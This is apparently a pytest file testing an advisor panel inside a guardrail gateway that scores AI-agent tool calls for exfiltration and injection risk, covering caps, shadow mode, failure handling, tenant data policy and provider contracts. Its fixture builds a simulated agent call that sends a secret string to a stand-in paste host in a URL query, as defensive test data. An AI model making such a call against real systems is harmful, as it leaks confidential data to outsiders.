"""Advisors: the contract, the panel's rules (uncertain band, caps, only tighten, no signal on
failure, tenant data policy), the providers, and the guard flow with advisors in it."""

import asyncio
import json
from types import SimpleNamespace

import httpx
import pytest

from app.advise.contract import Answer, Question, build_features, points_for
from app.advise.factory import build_panel, parse_config
from app.advise.panel import AdvisorPanel, PanelConfig, hosted_allowed
from app.advise.providers.local import LocalAdvisor, load_model, vectorize
from app.advise.providers.remote import BedrockAdvisor, HttpAdvisor, parse_model_answer
from app.context.builder import ContextBuilder
from app.context.catalog import ActionRule, AgentInfo, CachedCatalog, TenantCatalog
from app.context.descriptors import describe
from app.engine.pipeline import GuardrailEngine
from app.gateway.flow import run_stage
from app.risk.contextual import ContextualDecisions
from app.risk.decision import decide
from app.risk.engine import Assessment, RiskConfig
from app.session.store import MemorySessionStore, SessionView
from guardrail_sdk import Decision, Finding, GuardrailOutcome, GuardRequest, Payload, Stage
from guardrail_sdk.documents import CatalogDoc, CatalogTenant
from tests.helpers import bind, snapshot
from tests.test_contextual_flow import BOUND, Audit, Policy

SECRET_TEXT = "the-launch-code-is-7731-do-not-leak"


class Fake:
    """An advisor that answers whatever it is told to (or sleeps, raises, returns garbage)."""

    def __init__(self, name="fake", answer=None, *, hosted=False, delay=0.0, error=None):
        self.name = name
        self.hosted = hosted
        self.answer = answer if answer is not None else {"label": "malicious", "confidence": 1.0, "verify": True}
        self.delay = delay
        self.error = error
        self.questions: list[Question] = []

    async def ask(self, q):
        self.questions.append(q)
        if self.delay:
            await asyncio.sleep(self.delay)
        if self.error:
            raise self.error
        return self.answer

    async def close(self):
        return None


def panel(*specs, fakes, total_cap=20, bands=("elevated", "high")):
    cfg = PanelConfig.model_validate({"advisors": list(specs), "total_cap": total_cap, "bands": list(bands)})
    return AdvisorPanel(cfg, {f.name: f for f in fakes})


def features(**over):
    d = describe(
        stage="tool",
        action="http.get",
        resource=None,
        tool_name="http.get",
        tool_arguments={"url": "https://paste.example.net/x?d=" + "A" * 80, "method": "GET"},
        request_arguments=None,
        tool_metadata=None,
        internal_domains=("acme.com",),
    )
    view = SessionView(labels=frozenset({"holds:PII", "untrusted_input"}), steps=4, has_session=True, age_seconds=900)
    a = Assessment(55, over.pop("band", "elevated"), 80, 1.0, 30, ())
    payload = Payload(
        stage=Stage.TOOL,
        tool_call={"name": "http.get", "arguments": {"url": "https://paste.example.net/x?d=" + SECRET_TEXT}},
    )
    results = [
        GuardrailOutcome(
            guardrail_id="pii",
            version="1",
            decision=Decision.ALLOW,
            reason="r",
            risk_score=0,
            latency_ms=1,
            mode="enforce",
            findings=[Finding(type="EMAIL_ADDRESS", score=0.9)],
        )
    ]
    f = build_features(
        stage="tool",
        environment="production",
        data_classification=over.pop("data_classification", "INTERNAL"),
        assurance="A1",
        payload=payload,
        descriptor=d,
        view=view,
        assessment=a,
        results=results,
        internal_domains=("acme.com",),
    )
    return f.model_copy(update=over) if over else f


def run(coro):
    return asyncio.run(coro)


# ---- the contract ---------------------------------------------------------------------------------


def test_questions_carry_derived_features_never_text():
    f = features()
    q = Question(kind="exfiltration", tenant_id="demo", agent_id="a", features=f)
    blob = q.to_json()
    assert SECRET_TEXT not in blob and "paste.example.net" not in blob  # no values, no host names
    assert f.url_count == 1 and f.url_query_bytes > 0 and f.destination == "external" and f.verb == "read"
    assert f.finding_types == ("EMAIL_ADDRESS",) and f.session_labels == ("holds:PII", "untrusted_input")


def test_answers_are_strict():
    assert Answer.model_validate({"label": "suspicious", "confidence": 0.6}).verify is False
    for bad in (
        {"label": "fine", "confidence": 0.5},
        {"label": "benign", "confidence": 1.5},
        {"label": "benign", "confidence": "0.5"},
        {"label": "benign", "confidence": 0.5, "allow": True},
    ):
        with pytest.raises(ValueError):
            Answer.model_validate(bad)


def test_points_are_capped_and_never_negative():
    assert points_for(Answer(label="malicious", confidence=1.0), 10) == 10
    assert points_for(Answer(label="suspicious", confidence=0.8), 10) == 4
    assert points_for(Answer(label="benign", confidence=1.0), 10) == 0


# ---- the panel ------------------------------------------------------------------------------------


def test_only_the_uncertain_band():
    p = panel({"name": "fake", "provider": "local", "mode": "enforce"}, fakes=[Fake()])
    for band in ("low", "critical"):
        assert (
            run(
                p.advise(tenant_id="t", agent_id="a", features=features(risk_band=band), hosted_classes=frozenset())
            ).ran
            is False
        )
    adv = run(p.advise(tenant_id="t", agent_id="a", features=features(risk_band="high"), hosted_classes=frozenset()))
    assert adv.ran and adv.points == 10 and adv.verify


def test_shadow_advisors_change_nothing_but_are_recorded():
    p = panel({"name": "fake", "provider": "local", "mode": "shadow"}, fakes=[Fake()])
    adv = run(p.advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset()))
    assert adv.points == 0 and adv.verify is False and adv.shadow_points == 10 and adv.shadow_verify
    assert {r.question for r in adv.records} == {"exfiltration", "injection"}


def test_caps_per_advisor_and_in_total():
    specs = [{"name": f"f{i}", "provider": "local", "mode": "enforce", "cap": 15} for i in range(3)]
    p = panel(*specs, fakes=[Fake(f"f{i}") for i in range(3)], total_cap=20)
    adv = run(p.advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset()))
    assert adv.points == 20  # 3 x 15, capped; each advisor counted once across its two questions


def test_failures_are_no_signal():
    specs = [
        {"name": "slow", "provider": "local", "mode": "enforce", "timeout_ms": 20},
        {"name": "broken", "provider": "local", "mode": "enforce"},
        {"name": "garbage", "provider": "local", "mode": "enforce"},
        {"name": "sneaky", "provider": "local", "mode": "enforce"},
    ]
    fakes = [
        Fake("slow", delay=0.5),
        Fake("broken", error=RuntimeError("boom")),
        Fake("garbage", answer="malicious!"),
        Fake("sneaky", answer={"label": "benign", "confidence": 1.0, "allow": True, "points": -50}),
    ]
    adv = run(
        panel(*specs, fakes=fakes).advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset())
    )
    assert adv.points == 0 and adv.verify is False
    status = {r.advisor: r.status for r in adv.records}
    assert status == {"slow": "timeout", "broken": "error", "garbage": "invalid", "sneaky": "invalid"}


def test_verify_requests_need_a_non_benign_answer_and_permission():
    specs = [
        {"name": "a", "provider": "local", "mode": "enforce", "allow_verify": False},
        {"name": "b", "provider": "local", "mode": "enforce"},
    ]
    fakes = [Fake("a"), Fake("b", answer={"label": "benign", "confidence": 0.9, "verify": True})]
    adv = run(
        panel(*specs, fakes=fakes).advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset())
    )
    assert adv.verify is False and adv.points == 10


def test_hosted_advisors_follow_the_tenant_data_policy():
    spec = {"name": "jev", "provider": "http", "mode": "shadow"}
    fake = Fake("jev", hosted=True)
    p = panel(spec, fakes=[fake])
    # the session holds PII: the tenant must allow PII (and the request's own class)
    adv = run(p.advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset({"INTERNAL"})))
    assert [r.status for r in adv.records] == ["skipped_policy", "skipped_policy"] and fake.questions == []
    adv = run(p.advise(tenant_id="t", agent_id="a", features=features(), hosted_classes=frozenset({"INTERNAL", "PII"})))
    assert {r.status for r in adv.records} == {"answered"}
    assert hosted_allowed(features(), frozenset()) is False


def test_config_is_validated():
    with pytest.raises(ValueError):
        parse_config('[{"name": "x", "provider": "magic"}]')
    with pytest.raises(ValueError):
        parse_config('[{"name": "x", "provider": "local", "cap": 50}]')
    with pytest.raises(ValueError):
        parse_config('[{"name": "x", "provider": "local"}, {"name": "x", "provider": "local"}]')
    with pytest.raises(ValueError):
        parse_config('[{"name": "x", "provider": "local", "questions": []}]')
    assert parse_config("") is None and parse_config("[]") is None
    cfg = parse_config('{"advisors": [{"name": "x", "provider": "local"}], "total_cap": 10}')
    assert cfg.total_cap == 10 and cfg.advisors[0].mode == "shadow"  # shadow is the default


# ---- the decision table -----------------------------------------------------------------------------


def test_advisor_verify_only_tightens_the_table():
    d = describe(
        stage="tool",
        action="x",
        resource=None,
        tool_name="http.get",
        tool_arguments={"url": "https://a.example/x", "method": "GET"},
        request_arguments=None,
        tool_metadata=None,
    )
    base = dict(
        engine_decision=Decision.ALLOW,
        band="elevated",
        descriptor=d,
        quarantined=False,
        accepts_obligations=True,
        cfg=RiskConfig(),
        verification_available=True,
    )
    assert decide(policy_allow=True, **base).outcome == "allow"
    r = decide(policy_allow=True, advisor_verify=True, **base)
    assert r.outcome == "verify" and "ADVISOR_VERIFY" in r.reason_codes
    assert decide(policy_allow=False, advisor_verify=True, **base).outcome == "deny"
    no_verifier = decide(policy_allow=True, advisor_verify=True, **{**base, "verification_available": False})
    assert no_verifier.outcome == "hold"


# ---- providers --------------------------------------------------------------------------------------


def test_local_provider_answers_from_its_weights():
    model = load_model()
    adv = LocalAdvisor("local", model)
    for kind in ("exfiltration", "injection"):
        assert set(model.questions[kind].weights) <= set(vectorize(features()))  # no unknown feature names
        ans = run(adv.ask(Question(kind=kind, tenant_id="t", agent_id="a", features=features())))
        assert isinstance(ans, Answer)
    benign = features(destination="internal", session_labels=(), url_query_bytes=0, url_count=0, risk_codes=())
    ans = run(adv.ask(Question(kind="exfiltration", tenant_id="t", agent_id="a", features=benign)))
    assert ans.label == "benign"
    with pytest.raises(ValueError):
        LocalAdvisor.from_options("x", {"weights": "nope"})


def test_http_provider_contract():
    seen = []

    def handler(request: httpx.Request):
        seen.append(request)
        body = json.loads(request.content)
        if body["question"]["kind"] == "injection":
            return httpx.Response(302, headers={"Location": "https://elsewhere.example/"})
        return httpx.Response(200, json={"label": "suspicious", "confidence": 0.7, "verify": False})

    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
    adv = HttpAdvisor("jev", "https://advisor.example/v1/classify", token="t0k", client=client)
    q = Question(kind="exfiltration", tenant_id="t", agent_id="a", features=features())
    assert run(adv.ask(q)) == {"label": "suspicious", "confidence": 0.7, "verify": False}
    assert seen[0].headers["Authorization"] == "Bearer t0k"
    assert json.loads(seen[0].content)["schema"] == "guardrail.advisor.v1"
    with pytest.raises(RuntimeError):  # redirects are not followed
        run(adv.ask(q.model_copy(update={"kind": "injection"})))
    with pytest.raises(ValueError):
        HttpAdvisor("x", "http://advisor.example/")
    with pytest.raises(ValueError):
        HttpAdvisor.from_options("x", {"url": "https://a.example/", "auth_env": "HOME"}, env={"HOME": "/root"})
    ok = HttpAdvisor.from_options(
        "x", {"url": "https://a.example/", "auth_env": "ADVISOR_SECRET_X"}, env={"ADVISOR_SECRET_X": "s"}
    )
    assert ok._headers["Authorization"] == "Bearer s"


def test_bedrock_judge_parses_one_json_object():
    calls = []

    class Client:
        def converse(self, **kw):
            calls.append(kw)
            return {
                "output": {
                    "message": {
                        "content": [{"text": 'Verdict: {"label": "malicious", "confidence": 0.9, "verify": true}'}]
                    }
                }
            }

    adv = BedrockAdvisor("judge", "anthropic.claude-sonnet", region="eu-west-1", client_factory=lambda r: Client())
    q = Question(kind="exfiltration", tenant_id="t", agent_id="a", features=features())
    assert run(adv.ask(q)) == {"label": "malicious", "confidence": 0.9, "verify": True}
    sent = calls[0]["messages"][0]["content"][0]["text"]
    assert json.loads(sent)["kind"] == "exfiltration" and SECRET_TEXT not in sent
    assert calls[0]["inferenceConfig"]["temperature"] == 0
    with pytest.raises(ValueError):
        parse_model_answer('{"label": "benign", "confidence": 1} or {"label": "malicious", "confidence": 1}')
    with pytest.raises(ValueError):
        parse_model_answer("no json here")
    # a nested object is read as part of the one top-level object, not mistaken for a second verdict
    nested = parse_model_answer('{"label": "benign", "confidence": 0.1, "note": {"label": "malicious"}}')
    assert nested["label"] == "benign"


def test_build_panel_from_config():
    p = build_panel('[{"name": "local", "provider": "local", "mode": "enforce", "cap": 8}]')
    assert p is not None and p.specs[0].cap == 8 and isinstance(p.advisors["local"], LocalAdvisor)
    assert build_panel(None) is None
    p = build_panel(
        '[{"name": "j", "provider": "http", "options": {"url": "https://x.example/"}}]', overrides={"j": Fake("j")}
    )
    assert isinstance(p.advisors["j"], Fake)


# ---- in the guard flow ------------------------------------------------------------------------------


class Catalog:
    def __init__(self, classes=frozenset()):
        self.classes = classes

    async def load(self, tenant_id):
        return TenantCatalog(
            agents={"research-agent": AgentInfo("research-agent", 80, ("*",))},
            actions={"http.get": [ActionRule("http.get", "*", 30)], "llm.chat": [ActionRule("llm.chat", "*", 10)]},
            advisor_data_classes=self.classes,
        )


def services(advisors, mode="enforce", classes=frozenset()):
    return SimpleNamespace(
        snapshots=SimpleNamespace(current=snapshot(bind("noop", stages=("input", "retrieval", "tool", "output")))),
        contexts=ContextBuilder(CachedCatalog(Catalog(classes)), "production"),
        policy=Policy(),
        engine=GuardrailEngine(escalate_as_block=True),
        audit=Audit(),
        control_plane=None,
        contextual=ContextualDecisions(MemorySessionStore(), mode=mode, verifier=None, advisors=advisors),
    )


GET = {
    "agent_id": "research-agent",
    "action": "http.get",
    "session_id": "s1",
    "payload": {
        "tool_call": {"name": "http.get", "arguments": {"url": "https://status.example.org/api", "method": "GET"}}
    },
}


def guard(svc, body=GET):
    return asyncio.run(
        run_stage(svc, BOUND, Stage.TOOL, GuardRequest.model_validate(body), request_id="r", trace_id="0" * 32)
    )


def test_flow_without_advisors_allows_the_elevated_read():
    res = guard(services(None))
    assert res.response.outcome == "allow" and res.response.risk.band == "elevated"
    assert "advisors" not in res.response.risk.model_dump()


def test_flow_enforcing_advisor_tightens_and_the_agent_never_sees_why():
    fake = Fake("secret-advisor-name")
    p = panel({"name": "secret-advisor-name", "provider": "local", "mode": "enforce"}, fakes=[fake])
    svc = services(p)
    res = guard(svc)
    r = res.response
    # verify without a verification engine is a hold; without a review queue that is a block
    assert r.decision == Decision.BLOCK and "ADVISOR_VERIFY" in r.reason_codes and "ADVISOR_RISK" in r.reason_codes
    assert "secret-advisor-name" not in r.model_dump_json()
    audited = svc.audit.events[-1]["risk"]["advisors"]
    assert audited["points"] == 10 and audited["verify"] is True
    assert {a["advisor"] for a in audited["answers"]} == {"secret-advisor-name"}
    assert SECRET_TEXT not in json.dumps(audited)


def test_flow_benign_advisor_cannot_loosen():
    fake = Fake("b", answer={"label": "benign", "confidence": 1.0})
    p = panel({"name": "b", "provider": "local", "mode": "enforce"}, fakes=[fake])
    base = guard(services(None)).response
    res = guard(services(p)).response
    assert (res.outcome, res.risk.score, res.risk.band) == (base.outcome, base.risk.score, base.risk.band)


def test_flow_shadow_advisor_is_audited_only():
    p = panel({"name": "s", "provider": "local", "mode": "shadow"}, fakes=[Fake("s")])
    svc = services(p)
    res = guard(svc).response
    assert res.outcome == "allow" and "ADVISOR_RISK" not in res.reason_codes
    assert svc.audit.events[-1]["risk"]["advisors"]["shadow_points"] == 10


def test_flow_low_risk_skips_advisors():
    fake = Fake("f")
    svc = services(panel({"name": "f", "provider": "local", "mode": "enforce"}, fakes=[fake]))
    res = asyncio.run(
        run_stage(
            svc,
            BOUND,
            Stage.INPUT,
            GuardRequest.model_validate(
                {"agent_id": "research-agent", "action": "llm.chat", "session_id": "s1", "payload": {"text": "hi"}}
            ),
            request_id="r",
            trace_id="0" * 32,
        )
    )
    assert res.response.outcome == "allow" and fake.questions == []


def test_flow_hosted_advisor_uses_the_catalogs_data_policy():
    fake = Fake("jev", hosted=True)
    spec = {"name": "jev", "provider": "http", "mode": "shadow"}
    guard(services(panel(spec, fakes=[fake])))
    assert fake.questions == []  # tenant hasn't opted in
    guard(services(panel(spec, fakes=[fake]), classes=frozenset({"INTERNAL"})))
    assert len(fake.questions) == 2


# ---- catalog --------------------------------------------------------------------------------------


def test_catalog_publishes_the_advisor_policy_only_when_set():
    t = CatalogTenant(id="demo", name="Demo")
    assert "advisor_data_classes" not in t.model_dump(mode="json")
    t2 = CatalogTenant(id="demo", name="Demo", advisor_data_classes=["INTERNAL", "PII"])
    assert t2.model_dump(mode="json")["advisor_data_classes"] == ["INTERNAL", "PII"]
    with pytest.raises(ValueError):
        CatalogTenant(id="demo", name="Demo", advisor_data_classes=["SECRET"])


def test_gateway_reads_the_advisor_policy_from_the_catalog():
    from app.engine.remote import CatalogHolder

    holder = CatalogHolder("production")
    doc = CatalogDoc(version="v1", tenants=[CatalogTenant(id="demo", name="Demo", advisor_data_classes=["INTERNAL"])])
    assert holder.apply(doc.model_dump(mode="json"))
    cat = asyncio.run(holder.load("demo"))
    assert cat.advisor_data_classes == frozenset({"INTERNAL"})
